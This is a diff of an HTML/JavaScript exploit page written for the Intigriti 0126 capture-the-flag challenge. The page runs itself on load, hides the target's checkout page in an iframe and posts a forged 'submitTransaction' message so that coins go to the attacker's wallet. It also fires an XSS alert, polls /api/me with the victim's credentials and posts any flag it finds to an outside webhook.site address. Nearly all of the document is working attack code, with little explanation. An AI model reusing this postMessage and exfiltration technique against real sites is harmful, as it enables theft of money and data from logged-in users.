@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti 0126 - Final Exploit</title>
+    <title>Test</title>
     <meta charset="UTF-8">
     <style>
         body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
@@ -15,15 +15,13 @@
     </style>
 </head>
 <body>
-    <h1>🎯 Intigriti Challenge 0126</h1>
+    <h1>🎯 Intigriti 0126 - Ultimate Test Exploit</h1>
     <div id="log"></div>
 
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
         const OUR_WALLET = '16472226db03703a192aa383237035a69f';
-        const WEBHOOK = 'https://webhook.site/8b582371-dd82-47ba-81e7-9c99b117e80f';
-        const CURRENCY = '1337COIN';
-        const AMOUNT = 1;
+        const WEBHOOK = 'https://webhook.site/534e5a34-26a8-4771-b140-0819b0ea2240';
 
         let step = 0;
 
@@ -47,167 +45,129 @@
             }).catch(() => {});
         }
 
-        // Non-blocking alert
-        function triggerAlert() {
-            setTimeout(() => {
-                try {
-                    alert('gigawatz');
-                    log('✅ XSS alert triggered!', 'success');
-                } catch(e) {
-                    log('Alert error:', 'error', { error: e.message });
-                }
-            }, 100);
-        }
-
         async function exploit() {
-            log('🚀 EXPLOIT START', 'info');
-            log('Target wallet:', 'info', { wallet: OUR_WALLET });
+            log('=== EXPLOIT START ===', 'info');
 
             try {
-                // STEP 1: Create and load iframe
-                log('Creating iframe to checkout.html...', 'info');
+                // STEP 1: Test if we have admin context from our page
+                log('Testing admin context from our page...', 'info');
+                const meCheck = await fetch(TARGET + '/api/me', { credentials: 'include' })
+                    .then(r => r.json())
+                    .catch(e => ({ error: e.message }));
+                log('Our page /api/me result:', 'info', meCheck);
+
+                // STEP 2: Create iframe
+                log('Creating iframe...', 'info');
                 const iframe = document.createElement('iframe');
-                iframe.id = 'checkoutIframe';
+                iframe.id = 'targetFrame';
                 iframe.style.display = 'none';
-                iframe.src = `${TARGET}/checkout.html?currency=${CURRENCY}&price=1`;
+                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
                 document.body.appendChild(iframe);
-                log('Iframe created:', 'info', { src: iframe.src });
+                log('Iframe created:', 'success', { src: iframe.src });
 
-                // STEP 2: Wait for iframe to FULLY load (extended timing)
-                log('Waiting for iframe to initialize (10s)...', 'warning');
-
+                // STEP 3: Extended wait for iframe
+                log('Waiting 15 seconds for iframe full initialization...', 'warning');
                 await new Promise(resolve => {
                     let loaded = false;
-
                     iframe.onload = () => {
                         loaded = true;
-                        log('iframe.onload fired', 'success');
-                        // Additional wait for init() to complete
-                        setTimeout(resolve, 5000); // 5s after onload
+                        log('iframe.onload fired!', 'success');
+                        // Wait additional 10s after onload
+                        setTimeout(resolve, 10000);
                     };
-
-                    // Max 10s total wait
+                    // Max 15s total
                     setTimeout(() => {
-                        if (!loaded) {
-                            log('iframe.onload timeout - using fallback', 'warning');
-                        }
+                        if (!loaded) log('onload timeout - using fallback', 'warning');
                         resolve();
-                    }, 10000);
+                    }, 15000);
                 });
+                log('Iframe wait complete', 'success');
 
-                log('Iframe should be ready now', 'info');
-
-                // STEP 3: Verify iframe is accessible
+                // STEP 4: Verify iframe accessibility
+                log('Checking iframe.contentWindow...', 'info');
                 if (!iframe.contentWindow) {
-                    log('❌ Cannot access iframe.contentWindow!', 'error');
+                    log('CANNOT access iframe.contentWindow!', 'error');
                     return;
                 }
-                log('Iframe contentWindow accessible', 'success');
+                log('Iframe.contentWindow accessible:', 'success');
 
-                // STEP 4: Additional wait for loadWallets() async operation
-                log('Waiting 5 more seconds for loadWallets() to complete...', 'info');
-                await new Promise(r => setTimeout(r, 5000));
-
-                // STEP 5: Send postMessage
-                log('📡 SENDING postMessage...', 'warning');
-                log('Message:', 'info', {
+                // STEP 5: Try to communicate via postMessage
+                log('Sending postMessage...', 'warning');
+                const payload = {
                     type: 'submitTransaction',
                     transaction: {
                         toAddress: OUR_WALLET,
-                        currency: CURRENCY,
-                        amount: AMOUNT
+                        currency: '1337COIN',
+                        amount: 1
                     }
-                });
+                };
 
                 try {
-                    iframe.contentWindow.postMessage({
-                        type: 'submitTransaction',
-                        transaction: {
-                            toAddress: OUR_WALLET,
-                            currency: CURRENCY,
-                            amount: AMOUNT
-                        }
-                    }, '*');
-                    log('✅ postMessage sent!', 'success');
+                    iframe.contentWindow.postMessage(payload, '*');
+                    log('postMessage sent successfully!', 'success');
                 } catch (e) {
-                    log('❌ postMessage failed:', 'error', { error: e.message });
+                    log('postMessage FAILED:', 'error', { error: e.message });
                     return;
                 }
 
-                // STEP 6: Trigger XSS alert (non-blocking)
-                log('Triggering XSS alert...', 'info');
-                triggerAlert();
+                // STEP 6: Trigger alert
+                log('Triggering alert(gigawatz)...', 'info');
+                setTimeout(() => alert('gigawatz'), 100);
+                log('Alert triggered', 'success');
 
                 // STEP 7: Wait and check for flag multiple times
-                log('Waiting for transaction (10s)...', 'info');
-                await new Promise(r => setTimeout(r, 10000));
+                log('Waiting for transaction (15s)...', 'info');
+                await new Promise(r => setTimeout(r, 15000));
 
-                for (let i = 0; i < 5; i++) {
-                    log(`Flag check ${i+1}/5...`, 'info');
+                for (let i = 0; i < 10; i++) {
+                    log(`Flag check ${i+1}/10...`, 'info');
                     const found = await checkFlag();
                     if (found) {
-                        log('🏆 FLAG FOUND - Stopping checks', 'success');
+                        log('FLAG FOUND - Stopping', 'success');
                         break;
                     }
-                    await new Promise(r => setTimeout(r, 3000));
+                    await new Promise(r => setTimeout(r, 5000));
                 }
 
-                log('Exploit execution complete', 'info');
-                log('Check webhook for full details', 'info');
+                log('=== EXPLOIT COMPLETE ===', 'info');
 
             } catch (error) {
-                log('❌ ERROR:', 'error', { error: error.message, stack: error.stack });
+                log('ERROR:', 'error', { error: error.message, stack: error.stack });
             }
         }
 
         async function checkFlag() {
             try {
-                const response = await fetch(`${TARGET}/api/me`, {
-                    credentials: 'include',
-                    headers: { 'Accept': 'application/json' }
+                const response = await fetch(TARGET + '/api/me', {
+                    credentials: 'include'
                 });
-
                 const data = await response.json();
 
-                log('API /me response:', 'info', {
+                log('Flag check result:', 'info', {
                     status: response.status,
                     hasFlag: !!data.flag,
                     flag: data.flag || 'none'
                 });
 
                 if (data.flag) {
-                    log('🏆🏆🏆 FLAG FOUND: ' + data.flag + ' 🏆🏆🏆', 'success');
-
-                    // Send flag to webhook
+                    log('🏆🏆🏆 FLAG: ' + data.flag + ' 🏆🏆🏆', 'success');
                     fetch(WEBHOOK, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        mode: 'no-cors',
-                        body: JSON.stringify({
-                            timestamp: new Date().toISOString(),
-                            flag: data.flag,
-                            challenge: 'intigriti-0126',
-                            wallet: OUR_WALLET
-                        })
+                        body: JSON.stringify({ flag: data.flag, found: true })
                     }).catch(() => {});
-
-                    // Also alert with flag
-                    setTimeout(() => alert('🏆 FLAG: ' + data.flag), 200);
+                    alert('🏆 FLAG: ' + data.flag);
                     return true;
                 }
-
                 return false;
-
             } catch (error) {
-                log('Flag check error:', 'error', { error: error.message });
+                log('Flag check ERROR:', 'error', { error: error.message });
                 return false;
             }
         }
 
-        // Auto-start for admin bot
         window.addEventListener('load', () => {
-            log('Page loaded - starting exploit...', 'info');
-            setTimeout(exploit, 500);
+            log('Page loaded, starting in 1s...', 'info');
+            setTimeout(exploit, 1000);
         });
     </script>
 </body>
